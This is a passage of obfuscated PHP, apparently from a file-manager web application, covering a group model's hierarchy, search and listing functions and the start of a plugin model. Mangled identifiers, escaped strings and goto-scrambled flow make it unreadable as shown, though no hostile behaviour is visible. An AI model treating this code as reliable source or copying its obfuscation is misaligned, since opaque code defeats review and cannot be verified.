$this->where($ašê«ù‡„¶)->data($A¾¾ÑçšÊ˜)->save(); goto bˆ¤èéÙ«“; F²‹ìÄ¬©: if ($EÛ‰Ä¥ÌŸ) { $fŸë¿Š¸÷î = $eÉŒ¬è¸ÜÙ[$f‚Ç•ÃÆ[454]] . $eÉŒ¬è¸ÜÙ[$f‚Ç•ÃÆ[2072]] . $f‚Ç•ÃÆ[47]; } $ašê«ù‡„¶ = array($f‚Ç•ÃÆ[520] => array($f‚Ç•ÃÆ[478], $aÂœñé„İª[$f‚Ç•ÃÆ[454]] . $aÂœñé„İª[$f‚Ç•ÃÆ[2072]] . $f‚Ç•ÃÆ[479])); $A¾¾ÑçšÊ˜ = array($f‚Ç•ÃÆ[520] => array($f‚Ç•ÃÆ[529], "\162\145\x70\154\x61\x63\x65\50\x70\x61\162\145\156\164\x4c\145\x76\145\154\x2c\x27{$DºÉî²İŸ™}\x27\54\x27{$fŸë¿Š¸÷î}\47\x29")); goto F†èæÙÀ•; dÎ¥Ø±„œŒ: $f‚Ç•ÃÆ =& $_SERVER[Ìó]; $DºÉî²İŸ™ = $aÂœñé„İª[$f‚Ç•ÃÆ[454]] . $aÂœñé„İª[$f‚Ç•ÃÆ[2072]] . $f‚Ç•ÃÆ[47]; $fŸë¿Š¸÷î = $eÉŒ¬è¸ÜÙ[$f‚Ç•ÃÆ[454]] . $eÉŒ¬è¸ÜÙ[$f‚Ç•ÃÆ[2072]] . $f‚Ç•ÃÆ[47] . $aÂœñé„İª[$f‚Ç•ÃÆ[2072]] . $f‚Ç•ÃÆ[47]; goto F²‹ìÄ¬©; bˆ¤èéÙ«“: } public function setNamePinyin($fÄá‘ŠÛÌÏ, $f ±¯Ô™ëù = false) { $c˜£î“ª®Ê =& $_SERVER[Ìó]; if (!$f ±¯Ô™ëù) { $b²§ï¾•ĞÌ = $this->getInfoSimple($fÄá‘ŠÛÌÏ); $f ±¯Ô™ëù = $b²§ï¾•ĞÌ[$c˜£î“ª®Ê[28]]; } if (!Input::check($f ±¯Ô™ëù, $c˜£î“ª®Ê[523])) { $this->metaSet($fÄá‘ŠÛÌÏ, $c˜£î“ª®Ê[411], null); $this->metaSet($fÄá‘ŠÛÌÏ, $c˜£î“ª®Ê[410], null); return; } $Cˆ¨÷²‹×Ø = array($c˜£î“ª®Ê[411] => str_replace($c˜£î“ª®Ê[50], $c˜£î“ª®Ê[33], Pinyin::encode($f ±¯Ô™ëù)), $c˜£î“ª®Ê[410] => Pinyin::encode($f ±¯Ô™ëù, $c˜£î“ª®Ê[524])); $this->metaSet($fÄá‘ŠÛÌÏ, $Cˆ¨÷²‹×Ø); } protected function groupStatus($cä‹ĞÈª™Ë, $FÂº¦§¡Ğ…, $CÅæ»Ã¤¬Ë = true) { $CÕÄ´ĞğÍ© =& $_SERVER[Ìó]; $AŸÌµë˜÷ = $this->getInfoSimple($cä‹ĞÈª™Ë); if (!$AŸÌµë˜÷) { return !1; } if ($CÅæ»Ã¤¬Ë) { $this->_groupStatusApply($AŸÌµë˜÷, $FÂº¦§¡Ğ…); } $aØ¬­Ó © = array($CÕÄ´ĞğÍ©[2072] => $cä‹ĞÈª™Ë, $CÕÄ´ĞğÍ©[89] => $CÕÄ´ĞğÍ©[685], $CÕÄ´ĞğÍ©[355] => $FÂº¦§¡Ğ…); return Model($CÕÄ´ĞğÍ©[2145])->add($aØ¬­Ó ©, array(), !0); } private function _groupStatusApply($EÆ‚ìÇ¹Â”, $AÖŒà‹¥ñ§) { $E‚Œ‘Ş«‚ =& $_SERVER[Ìó]; if ($AÖŒà‹¥ñ§ == $E‚Œ‘Ş«‚[83]) { $dÒ±¡¦ªë÷ = $this->parentLevelArray($EÆ‚ìÇ¹Â”[$E‚Œ‘Ş«‚[454]]); } else { $c—”Ûˆ¨øé = array($E‚Œ‘Ş«‚[520] => array($E‚Œ‘Ş«‚[478], $EÆ‚ìÇ¹Â”[$E‚Œ‘Ş«‚[454]] . $EÆ‚ìÇ¹Â”[$E‚Œ‘Ş«‚[2072]] . $E‚Œ‘Ş«‚[479])); $dÒ±¡¦ªë÷ = $this->where($c—”Ûˆ¨øé)->field($E‚Œ‘Ş«‚[2072])->select(); $dÒ±¡¦ªë÷ = array_to_keyvalue($dÒ±¡¦ªë÷, $E‚Œ‘Ş«‚[33], $E‚Œ‘Ş«‚[2072]); } if (empty($dÒ±¡¦ªë÷)) { return; } $c—”Ûˆ¨øé = array($E‚Œ‘Ş«‚[2072] => array($E‚Œ‘Ş«‚[7], $dÒ±¡¦ªë÷), $E‚Œ‘Ş«‚[89] => $E‚Œ‘Ş«‚[685], $E‚Œ‘Ş«‚[355] => $AÖŒà‹¥ñ§ ? $E‚Œ‘Ş«‚[463] : $E‚Œ‘Ş«‚[83]); Model($E‚Œ‘Ş«‚[2145])->where($c—”Ûˆ¨øé)->save(array($E‚Œ‘Ş«‚[355] => $AÖŒà‹¥ñ§)); } protected function groupRemove($Añ™²¥Ï°„) { goto CË¶¤‚‡Öš; CùÆ„·—É£: $this->where(array($B¥Û…Ş˜”¢[456] => $Añ™²¥Ï°„))->save(array($B¥Û…Ş˜”¢[456] => $aÃøê«©ˆÚ[$B¥Û…Ş˜”¢[456]])); Model($B¥Û…Ş˜”¢[2145])->where($F„¤¿˜ô›„)->delete(); Model($B¥Û…Ş˜”¢[2146])->where($F„¤¿˜ô›„)->delete(); goto Bà¹¾‹âÍ; CË¶¤‚‡Öš: $B¥Û…Ş˜”¢ =& $_SERVER[Ìó]; $F„¤¿˜ô›„ = array($B¥Û…Ş˜”¢[2072] => $Añ™²¥Ï°„); $aÃøê«©ˆÚ = $this->where($F„¤¿˜ô›„)->find(); goto aêéÔ±‰µ; Bà¹¾‹âÍ: Model($B¥Û…Ş˜”¢[748])->groupRootRemove($Añ™²¥Ï°„); return $this->where($F„¤¿˜ô›„)->delete(); goto B’œÂ„¦êÙ; aêéÔ±‰µ: if (!$aÃøê«©ˆÚ || $aÃøê«©ˆÚ[$B¥Û…Ş˜”¢[456]] == 0) { return !1; } $C«Ï¼ä†­› = $this->getInfoSimple($aÃøê«©ˆÚ[$B¥Û…Ş˜”¢[456]]); $this->_changeChildLevel($aÃøê«©ˆÚ, $C«Ï¼ä†­›, !0); goto CùÆ„·—É£; B’œÂ„¦êÙ: } public function listData() { $eœåñ‘åÆ÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eœåñ‘åÆ÷[$_SERVER[Ìó][350]]); return $eœåñ‘åÆ÷; } private function _makeOrder($Aíõ±¼±Ú‹ = '') { goto AíÂ‹‚º–ë; cæî·¿ÙÊÓ: $BùÉ¹¼ÙëÄ = Input::get($Cºæ§ÎÇçÎ[402], $Cºæ§ÎÇçÎ[7], $Cºæ§ÎÇçÎ[2076], $b‰ù¢­àæì); $CÛ‰‰Õ´÷ = Input::get($Cºæ§ÎÇçÎ[403], $Cºæ§ÎÇçÎ[7], $Cºæ§ÎÇçÎ[2147], array($Cºæ§ÎÇçÎ[2147], $Cºæ§ÎÇçÎ[399])); $CÛ‰‰Õ´÷ = $DŠ„ŠÉğÆª[$CÛ‰‰Õ´÷]; goto aõ°ƒ©ù³’; AíÂ‹‚º–ë: $Cºæ§ÎÇçÎ =& $_SERVER[Ìó]; $b‰ù¢­àæì = array($Cºæ§ÎÇçÎ[2072], $Cºæ§ÎÇçÎ[28], $Cºæ§ÎÇçÎ[2058], $Cºæ§ÎÇçÎ[183]); $DŠ„ŠÉğÆª = array($Cºæ§ÎÇçÎ[397] => $Cºæ§ÎÇçÎ[398], $Cºæ§ÎÇçÎ[399] => $Cºæ§ÎÇçÎ[400]); goto cæî·¿ÙÊÓ; aõ°ƒ©ù³’: $Aíõ±¼±Ú‹ = $Aíõ±¼±Ú‹ . "{$BùÉ¹¼ÙëÄ}\x20{$CÛ‰‰Õ´÷}\54\40\x67\x72\x6f\165\x70\x49\x44\40\141\x73\143"; return $this->order($Aíõ±¼±Ú‹); goto F“¡´†ÁÓå; F“¡´†ÁÓå: } public function listChild($BØí¯äèºê) { $fÒ®“Ö«Ì¶ =& $_SERVER[Ìó]; $bñ…Ÿ›ôœ = $this->where(array($fÒ®“Ö«Ì¶[456] => $BØí¯äèºê))->_makeOrder()->selectPage(200); $this->_listDataApply($bñ…Ÿ›ôœ[$fÒ®“Ö«Ì¶[350]]); return $bñ…Ÿ›ôœ; } public function listByID($A–¾¾ó‚·) { $CÌÀšÊë‘ =& $_SERVER[Ìó]; if (!$A–¾¾ó‚·) { return array(); } $FÓƒö«²ø„ = array($CÌÀšÊë‘[2072] => array($CÌÀšÊë‘[7], $A–¾¾ó‚·)); $b§ÊÏ¥ì’ = $this->where($FÓƒö«²ø„)->select(); $this->_listDataApply($b§ÊÏ¥ì’); return $b§ÊÏ¥ì’; } public function listSearch($a‘¿ÔŸĞÕ ) { goto E£ŸÑïÚŸ£; C­›«©ÚÄ¬: $this->_listDataApply($dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[350]]); return $dĞŠçõÁÄÜ; goto E¢¯Ä°¤Ğ²; bÚ¶ÏÛç›: $dĞŠçõÁÄÜ = $this->_makeOrder()->where($C¨ÎÂÛ¤šÎ)->selectPage(20); $dĞŠçõÁÄÜ = $dĞŠçõÁÄÜ ? $dĞŠçõÁÄÜ : array(); if (!$dĞŠçõÁÄÜ || count($dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[350]]) < 5 && Input::check($E‚ç›İ‚±Â, $CŠ‚áØñ¨†[302])) { $b›·‰‘Ù¯ = $this->_searchFromMeta($CŠ‚áØñ¨†[410], $E‚ç›İ‚±Â, 10); $c’Ğœå†­ = $this->_searchFromMeta($CŠ‚áØñ¨†[411], $E‚ç›İ‚±Â, 10); $dæ¼´½³¡ã = array_merge($b›·‰‘Ù¯, $c’Ğœå†­, $dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[350]]); $dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[350]] = array_unique_by_key($dæ¼´½³¡ã, $CŠ‚áØñ¨†[2072]); $dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[347]][$CŠ‚áØñ¨†[348]] = count($dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[350]]); $dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[347]][$CŠ‚áØñ¨†[349]] = ceil($dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[347]][$CŠ‚áØñ¨†[348]] / $dĞŠçõÁÄÜ[$CŠ‚áØñ¨†[347]][$CŠ‚áØñ¨†[345]]); } goto C­›«©ÚÄ¬; E£ŸÑïÚŸ£: $CŠ‚áØñ¨† =& $_SERVER[Ìó]; $E‚ç›İ‚±Â = $a‘¿ÔŸĞÕ [$CŠ‚áØñ¨†[2148]]; $C¿Ä×ÂœïÑ = isset($a‘¿ÔŸĞÕ [$CŠ‚áØñ¨†[2149]]) ? $a‘¿ÔŸĞÕ [$CŠ‚áØñ¨†[2149]] : !1; goto böŞÇ·¡´; böŞÇ·¡´: if (!trim($E‚ç›İ‚±Â)) { return !1; } $E‚ç›İ‚±Â = str_replace($CŠ‚áØñ¨†[2150], $CŠ‚áØñ¨†[2151], $E‚ç›İ‚±Â); $C¨ÎÂÛ¤šÎ = array($CŠ‚áØñ¨†[2072] => array($CŠ‚áØñ¨†[747], "\x25{$E‚ç›İ‚±Â}\x25"), $CŠ‚áØñ¨†[28] => array($CŠ‚áØñ¨†[747], "\x25{$E‚ç›İ‚±Â}\x25"), $CŠ‚áØñ¨†[912] => $CŠ‚áØñ¨†[2152]); goto bÚ¶ÏÛç›; E¢¯Ä°¤Ğ²: } private function _searchFromMeta($DŒ©éËóİÀ, $a¤®¤¾áÑ…, $EòËµ„™›±) { goto B–ãˆ¾Õ‡ù; B–ãˆ¾Õ‡ù: $b“‡›à§®Å =& $_SERVER[Ìó]; $a¤®¤¾áÑ… = strtolower($a¤®¤¾áÑ…); $BÈ‰âƒå“ = array($b“‡›à§®Å[89] => $DŒ©éËóİÀ, $b“‡›à§®Å[355] => array($b“‡›à§®Å[747], "\x25{$a¤®¤¾áÑ…}\45")); goto bÚ½¯ÕÂˆí; B——É ƒ…Ğ: $a‘ÄïÃ„È = $this->where(array($b“‡›à§®Å[2144] => array($b“‡›à§®Å[7], $B’Û‹ÒÑĞë)))->select(); if (!$a‘ÄïÃ„È) { return array(); } return $a‘ÄïÃ„È; goto EŒáà«‘; bÚ½¯ÕÂˆí: $B’Û‹ÒÑĞë = Model($b“‡›à§®Å[2153])->where($BÈ‰âƒå“)->limit($EòËµ„™›±)->select(); if (!$B’Û‹ÒÑĞë) { return array(); } $B’Û‹ÒÑĞë = array_to_keyvalue($B’Û‹ÒÑĞë, $b“‡›à§®Å[33], $b“‡›à§®Å[2072]); goto B——É ƒ…Ğ; EŒáà«‘: } protected function _listDataApplyItem($aîÂÓšİŞæ) { $Fî‹šäƒ–ë = array($aîÂÓšİŞæ); $this->_listDataApply($Fî‹šäƒ–ë); return $Fî‹šäƒ–ë[0]; } protected function _listDataApply(&$FÈ‘è™Œ) { goto eÖ×àØºÔ°; dÈÔÉ™ÀîĞ: $this->_listAppendParent($FÈ‘è™Œ); $this->_listAppendSourceRoot($FÈ‘è™Œ, $DºÏºğÄ•); goto E ×‹ŞÕó¼; eÖ×àØºÔ°: $C†É³–‡˜µ =& $_SERVER[Ìó]; if (!$FÈ‘è™Œ) { return; } $DºÏºğÄ• = array_to_keyvalue($FÈ‘è™Œ, $C†É³–‡˜µ[33], $C†É³–‡˜µ[2072]); goto dÔ±Å‡å…; dÔ±Å‡å…: $this->_listAppendChildren($FÈ‘è™Œ); $this->_listAppendChildrenMember($FÈ‘è™Œ); $this->_listAppendMeta($FÈ‘è™Œ, $DºÏºğÄ•); goto dÈÔÉ™ÀîĞ; E ×‹ŞÕó¼: } private function _listAppendChildren(&$e¤ÈÖ‘Ûˆµ) { goto eÅøà´Ÿ¬; bô×îìÈº‚: $bâÒçØç½ = array_to_keyvalue($bâÒçØç½, $dĞ…´±Ã¥Í[445]); foreach ($e¤ÈÖ‘Ûˆµ as &$DŠë¡ãÇªÛ) { $DŠë¡ãÇªÛ[$dĞ…´±Ã¥Í[2154]] = isset($bâÒçØç½[$DŠë¡ãÇªÛ[$dĞ…´±Ã¥Í[2072]] . $dĞ…´±Ã¥Í[2155]]); } goto AÖ—‚ŞÊôà; e«Œ³À—±¶: $EîÃĞâ÷Ö = count($e¤ÈÖ‘Ûˆµ); $Fª«Î”Ú¸ = $this->tablePrefix . $this->tableName; for ($a¨ñÜ‰ÃøÎ = 0, $FğÒœÑÆ½¡ = 0; $a¨ñÜ‰ÃøÎ < $EîÃĞâ÷Ö; $a¨ñÜ‰ÃøÎ++) { $FğÒœÑÆ½¡++; $eŠÈÊØËî = $e¤ÈÖ‘Ûˆµ[$a¨ñÜ‰ÃøÎ][$dĞ…´±Ã¥Í[2072]]; $Aìáİ‚†´ë .= "\x53\105\114\105\x43\124\40\52\40\x46\122\x4f\115\40\x28\x53\105\x4c\x45\x43\124\x20\x27{$eŠÈÊØËî}\137\x63\x68\x69\154\144\47\x20\141\163\x20\150\141\x73\40\x46\x52\117\115\40\x60{$Fª«Î”Ú¸}\140\x20\x77\150\145\x72\145\40\160\x61\162\145\156\x74\111\x44\x3d{$eŠÈÊØËî}\40\154\151\155\151\164\x20\61\x29\40\x61\x73\x20\164\142\x5f{$eŠÈÊØËî}\x20\165\x6e\x69\x6f\x6e\x20\x61\x6c\154\x20"; if (($FğÒœÑÆ½¡ >= 20 || $a¨ñÜ‰ÃøÎ == $EîÃĞâ÷Ö - 1) && $Aìáİ‚†´ë) { $Aìáİ‚†´ë = substr($Aìáİ‚†´ë, 0, -strlen($dĞ…´±Ã¥Í[444])); $c˜Èø‡öª = $this->query($Aìáİ‚†´ë); $bâÒçØç½ = array_merge($bâÒçØç½, $c˜Èø‡öª); $FğÒœÑÆ½¡ = 0; $Aìáİ‚†´ë = $dĞ…´±Ã¥Í[33]; } } goto bô×îìÈº‚; eÅøà´Ÿ¬: $dĞ…´±Ã¥Í =& $_SERVER[Ìó]; $Aìáİ‚†´ë = $dĞ…´±Ã¥Í[357]; $bâÒçØç½ = array(); goto e«Œ³À—±¶; AÖ—‚ŞÊôà: } private function _listAppendChildrenMember(&$EºŸ¶¥½‚…) { goto a£†¿˜Ş‡õ; a£†¿˜Ş‡õ: $DÏÅˆ÷œ¹» =& $_SERVER[Ìó]; $D†ÚŸÎõ±Ú = $DÏÅˆ÷œ¹»[357]; $cÄöÛ²Åˆ™ = array(); goto FÌÎë®í—­; FÌÎë®í—­: $D‘ê¢ÕÃ— = count($EºŸ¶¥½‚…); $e‡©©ÂñÑ´ = $this->tablePrefix . $DÏÅˆ÷œ¹»[2146]; for ($F …²õŞ‚ì = 0, $Dù¯™Öœ¸ = 0; $F …²õŞ‚ì < $D‘ê¢ÕÃ—; $F …²õŞ‚ì++) { $Dù¯™Öœ¸++; $C…´˜ğ‰¸ê = $EºŸ¶¥½‚…[$F …²õŞ‚ì][$DÏÅˆ÷œ¹»[2072]]; $D†ÚŸÎõ±Ú .= "\x53\105\x4c\x45\103\x54\x20\x2a\x20\106\x52\x4f\115\40\50\123\105\x4c\105\x43\x54\x20\47{$C…´˜ğ‰¸ê}\137\143\x68\151\154\x64\x27\x20\x61\x73\40\x68\141\x73\x20\106\122\x4f\x4d\40\140{$e‡©©ÂñÑ´}\140\40\x77\x68\145\x72\145\x20\147\162\157\165\x70\111\x44\75{$C…´˜ğ‰¸ê}\40\154\151\155\151\164\x20\61\x29\x20\x61\163\40\x74\x62\x5f{$C…´˜ğ‰¸ê}\x20\x75\156\x69\157\156\x20\141\154\x6c\x20"; if (($Dù¯™Öœ¸ >= 20 || $F …²õŞ‚ì == $D‘ê¢ÕÃ— - 1) && $D†ÚŸÎõ±Ú) { $D†ÚŸÎõ±Ú = substr($D†ÚŸÎõ±Ú, 0, -strlen($DÏÅˆ÷œ¹»[444])); $B‚ªà·æ¬ğ = $this->query($D†ÚŸÎõ±Ú); $cÄöÛ²Åˆ™ = array_merge($cÄöÛ²Åˆ™, $B‚ªà·æ¬ğ); $Dù¯™Öœ¸ = 0; $D†ÚŸÎõ±Ú = $DÏÅˆ÷œ¹»[33]; } } goto Dö’Óî®Ê‚; Dö’Óî®Ê‚: $cÄöÛ²Åˆ™ = array_to_keyvalue($cÄöÛ²Åˆ™, $DÏÅˆ÷œ¹»[445]); foreach ($EºŸ¶¥½‚… as &$AÂŠîî×”›) { $AÂŠîî×”›[$DÏÅˆ÷œ¹»[2156]] = isset($cÄöÛ²Åˆ™[$AÂŠîî×”›[$DÏÅˆ÷œ¹»[2072]] . $DÏÅˆ÷œ¹»[2155]]); } goto eÌ¨ªØÎ×˜; eÌ¨ªØÎ×˜: } private function _listAppendMeta(&$Eã÷–ÊÏ‡, $cØ«ä«Ó˜) { $f•¸ªÍñìƒ =& $_SERVER[Ìó]; $AøÉ«Î­Šã = array($f•¸ªÍñìƒ[2072] => array($f•¸ªÍñìƒ[7], $cØ«ä«Ó˜)); $dã‹íğ×Ã = Model($f•¸ªÍñìƒ[2145])->where($AøÉ«Î­Šã)->select(); $dã‹íğ×Ã = array_to_keyvalue_group($dã‹íğ×Ã, $f•¸ªÍñìƒ[2072]); foreach ($dã‹íğ×Ã as &$F’ƒ¾ğ«ÒÄ) { $F’ƒ¾ğ«ÒÄ = array_to_keyvalue($F’ƒ¾ğ«ÒÄ, $f•¸ªÍñìƒ[89], $f•¸ªÍñìƒ[355]); } foreach ($Eã÷–ÊÏ‡ as &$cÒá«¬éÚß) { $cÒá«¬éÚß[$f•¸ªÍñìƒ[412]] = array(); if (isset($dã‹íğ×Ã[$cÒá«¬éÚß[$f•¸ªÍñìƒ[2072]]])) { $cÒá«¬éÚß[$f•¸ªÍñìƒ[412]] = $dã‹íğ×Ã[$cÒá«¬éÚß[$f•¸ªÍñìƒ[2072]]]; } } } protected function parentLevelArray($C‚Åä…æÀ») { $E·²ĞïÁÚæ =& $_SERVER[Ìó]; $C‚Åä…æÀ» = explode($E·²ĞïÁÚæ[47], trim($C‚Åä…æÀ», $E·²ĞïÁÚæ[47])); $C‚Åä…æÀ» = array_remove_value($C‚Åä…æÀ», $E·²ĞïÁÚæ[463]); return $C‚Åä…æÀ»; } private function _listAppendParent(&$c‚Şîéİ) { goto b¡ÕôØîî³; fˆÀ‚ò’ÛË: $bŒÉÎè¾èÁ = array(); foreach ($AÑ‡¥ŞçŠë as $c®ØĞ²®‡Æ => $EâÀ…‚…ô›) { if (!$EâÀ…‚…ô›) { $bŒÉÎè¾èÁ[] = $c®ØĞ²®‡Æ; } } if ($bŒÉÎè¾èÁ) { $f™ŸÎ¿ê•½ = array($CôÃ¡Â¼[2144] => array($CôÃ¡Â¼[380], $bŒÉÎè¾èÁ)); $BÍáÅÏÌ“ = $this->field($CôÃ¡Â¼[2157])->where($f™ŸÎ¿ê•½)->select(); $bÑö‰¹ïù‡ = array_to_keyvalue($BÍáÅÏÌ“, $CôÃ¡Â¼[2072], $CôÃ¡Â¼[28]); $AÑ‡¥ŞçŠë = array_merge_index($AÑ‡¥ŞçŠë, $bÑö‰¹ïù‡); } goto aŠ†ö’®½†; b¡ÕôØîî³: $CôÃ¡Â¼ =& $_SERVER[Ìó]; $AÑ‡¥ŞçŠë = array(); foreach ($c‚Şîéİ as &$c©Ñ‡‰ÈÚ) { $AÑ‡¥ŞçŠë[$c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[2072]]] = $c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[28]]; $FåÒ· ´·™ = $this->parentLevelArray($c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[454]]); foreach ($FåÒ· ´·™ as $aÙìØåĞµ) { if (!isset($AÑ‡¥ŞçŠë[$aÙìØåĞµ])) { $AÑ‡¥ŞçŠë[$aÙìØåĞµ] = 0; } } } goto fˆÀ‚ò’ÛË; aŠ†ö’®½†: foreach ($c‚Şîéİ as &$c©Ñ‡‰ÈÚ) { $FåÒ· ´·™ = $this->parentLevelArray($c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[454]]); $d…¡ éñï = $CôÃ¡Â¼[33]; foreach ($FåÒ· ´·™ as $aÙìØåĞµ) { $d…¡ éñï .= $AÑ‡¥ŞçŠë[$aÙìØåĞµ] . $CôÃ¡Â¼[8]; } if ($FåÒ· ´·™) { $d…¡ éñï .= $c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[28]]; } $c©Ñ‡‰ÈÚ[$CôÃ¡Â¼[458]] = str_replace($CôÃ¡Â¼[462], $CôÃ¡Â¼[8], $d…¡ éñï); } goto d¯ù È»¿î; d¯ù È»¿î: } private function _listAppendSourceRoot(&$FÛƒ…£“±›, $BÁ¢÷¥¤„) { goto E¥“›¶Á‰˜; e‹ÅÀé¸¾ô: foreach ($FÛƒ…£“±› as &$EŸâšŠ³àß) { $EŸâšŠ³àß[$FÜÉ³«ƒ“¦[387]] = $b×¨£Ûö££[$EŸâšŠ³àß[$FÜÉ³«ƒ“¦[2072]]] ? $b×¨£Ûö££[$EŸâšŠ³àß[$FÜÉ³«ƒ“¦[2072]]] : array(); } goto B²æ‘è†‚æ; E¥“›¶Á‰˜: $FÜÉ³«ƒ“¦ =& $_SERVER[Ìó]; $a‡°—ÒÑ‘ = array($FÜÉ³«ƒ“¦[367] => SourceModel::TYPE_GROUP, $FÜÉ³«ƒ“¦[456] => 0, $FÜÉ³«ƒ“¦[451] => array($FÜÉ³«ƒ“¦[7], $BÁ¢÷¥¤„)); $a ãğªğ×† = $FÜÉ³«ƒ“¦[2158]; goto AöÙÑª¥‘Ş; AöÙÑª¥‘Ş: $b×¨£Ûö££ = Model($FÜÉ³«ƒ“¦[748])->order($FÜÉ³«ƒ“¦[2159])->field($a ãğªğ×†)->where($a‡°—ÒÑ‘)->select(); $b×¨£Ûö££ = array_to_keyvalue($b×¨£Ûö££, $FÜÉ³«ƒ“¦[451]); $b×¨£Ûö££ = array_remove_key($b×¨£Ûö££, $FÜÉ³«ƒ“¦[451]); goto e‹ÅÀé¸¾ô; B²æ‘è†‚æ: } protected function resetParentLevel() { $Eí›í¢İ•ô =& $_SERVER[Ìó]; $AæŠ¡³ƒŞ¬ = $Eí›í¢İ•ô[2072]; $D¨¼”Ÿ•„ = $this->select(); $D¨¼”Ÿ•„ = array_to_keyvalue($D¨¼”Ÿ•„, $AæŠ¡³ƒŞ¬); foreach ($D¨¼”Ÿ•„ as $AÜÒª²Ü¦) { goto f™À¾„¬é; B”ÊÕÈÄ: $this->where(array($AæŠ¡³ƒŞ¬ => $AÜÒª²Ü¦[$AæŠ¡³ƒŞ¬]))->save(array($Eí›í¢İ•ô[520] => $d¿’¦ÎòÃ£)); goto dì¯³Âíèƒ; eìé«—³¥Â: $d¿’¦ÎòÃ£[] = 0; $d¿’¦ÎòÃ£ = $Eí›í¢İ•ô[47] . implode($Eí›í¢İ•ô[47], array_reverse($d¿’¦ÎòÃ£)) . $Eí›í¢İ•ô[47]; $this->setNamePinyin($AÜÒª²Ü¦[$AæŠ¡³ƒŞ¬], $AÜÒª²Ü¦[$Eí›í¢İ•ô[28]]); goto B”ÊÕÈÄ; f™À¾„¬é: $eØ˜°ë‚±® = $AÜÒª²Ü¦; $d¿’¦ÎòÃ£ = array(); while ($eØ˜°ë‚±®[$Eí›í¢İ•ô[456]] != 0) { $d¿’¦ÎòÃ£[] = $eØ˜°ë‚±®[$Eí›í¢İ•ô[456]]; $eØ˜°ë‚±® = $D¨¼”Ÿ•„[$eØ˜°ë‚±®[$Eí›í¢İ•ô[456]]]; } goto eìé«—³¥Â; dì¯³Âíèƒ: } return $D¨¼”Ÿ•„; } public function groupNameAuto($B¤‘‡…–Š¥, $cï¡Û£¾ˆÓ) { $dŸá‘ß‘ƒí =& $_SERVER[Ìó]; $cÍÇÕİÖƒİ = $this->where(array($dŸá‘ß‘ƒí[364] => $B¤‘‡…–Š¥))->getField($dŸá‘ß‘ƒí[28], !0); if (!$cÍÇÕİÖƒİ || !in_array($cï¡Û£¾ˆÓ, $cÍÇÕİÖƒİ)) { return $cï¡Û£¾ˆÓ; } for ($B›‚£’òŒ = 1; $B›‚£’òŒ <= count($cÍÇÕİÖƒİ) + 1; $B›‚£’òŒ++) { $EŠì˜ÜƒĞ’ = $cï¡Û£¾ˆÓ . "\50{$B›‚£’òŒ}\x29"; if (!in_array($EŠì˜ÜƒĞ’, $cÍÇÕİÖƒİ)) { return $EŠì˜ÜƒĞ’; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x70\154\165\x67\x69\156\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x73\164\x61\x74\x75\163", "\162\145\147\x69\x65\x73\x74", "\x63\x6f\x6e\x66\x69\x67"); public function loadList($AË¶—˜Úˆ = false) { $D¡Ñ¢£ÛÍ = array_to_keyvalue($this->listData(), $_SERVER[Ìó][28]); if ($AË¶—˜Úˆ) { return $D¡Ñ¢£ÛÍ[$AË¶—˜Úˆ]; } return $D¡Ñ¢£ÛÍ; } public function init() { $bå†ßåñÆ¬ =& $_SERVER[Ìó]; Hook::trigger($bå†ßåñÆ¬[2160]); $DÙŒí¸·ê¬ = $this->loadPluginList(); foreach ($DÙŒí¸·ê¬ as $F¿Åñ”Õ  => $aç®…­İ™·) { $a‹ªÄ›´–² = $this->appAllow($F¿Åñ”Õ , $aç®…­İ™·); if (!$a‹ªÄ›´–²) { continue; } foreach ($aç®…­İ™·[$bå†ßåñÆ¬[2161]] as $A’ÌòÆ»°È => $EÊ°·¤) { Hook::bind($A’ÌòÆ»°È, $EÊ°·¤); } } Hook::trigger($bå†ßåñÆ¬[2162]); Hook::trigger(ACTION); } public function appAllow($B¨’‹É“É–, $c‚­¾§»‰, $a×œ†ˆõ˜ = true) { $eß›»±‰á¸ =& $_SERVER[Ìó]; $aÈàï¼ÃÖ’ = PLUGIN_DIR . $B¨’‹É“É– . $eß›»±‰á¸[2163]; if (!is_array($c‚­¾§»‰) || !is_array($c‚­¾§»‰[$eß›»±‰á¸[2161]]) || !is_file($aÈàï¼ÃÖ’) || $c‚­¾§»‰[$eß›»±‰á¸[685]] != 1) { return !1; } if ($a×œ†ˆõ˜ && !Action($eß›»±‰á¸[2164])->checkAuth($B¨’‹É“É–)) { return !1; } return !0; } public function unInstall($DŸì†‡™‹) { $B°áõßÂ§ƒ =& $_SERVER[Ìó]; $f¸Ñ¡–•å½ = $this->loadList($DŸì†‡™‹); if (file_exists(PLUGIN_DIR . $DŸì†‡™‹)) { Hook::apply($DŸì†‡™‹ . $B°áõßÂ§ƒ[2165]); } $this->remove($f¸Ñ¡–•å½[$B°áõßÂ§ƒ[363]]); } public function changeStatus($Fº´ŞÆ Îº, $a˜ÚØ©†) { $FÅ¾§‹íÑ =& $_SERVER[Ìó]; $Cœ¢¹„¹ê® = $this->loadList($Fº´ŞÆ Îº); if ($a˜ÚØ©†) { Hook::apply($Fº´ŞÆ Îº . $FÅ¾§‹íÑ[2166]); } $this->update($Cœ¢¹„¹ê®[$FÅ¾§‹íÑ[363]], array($FÅ¾§‹íÑ[2167] => $a˜ÚØ©†)); } public function appRegist($CóÏ›¯ù´ë, $FÚ¤™º¦¼³) { $d‘æÆ¼äƒ¦ =& $_SERVER[Ìó]; $eÄÑÙ•—æ = $this->loadList($CóÏ›¯ù´ë); if ($eÄÑÙ•—æ) { $this->update($eÄÑÙ•—æ[$d‘æÆ¼äƒ¦[363]], array($d‘æÆ¼äƒ¦[2161] => $FÚ¤™º¦¼³)); } else { $CßÜô®ŒŞ = array($d‘æÆ¼äƒ¦[28] => $CóÏ›¯ù´ë, $d‘æÆ¼äƒ¦[2161] => 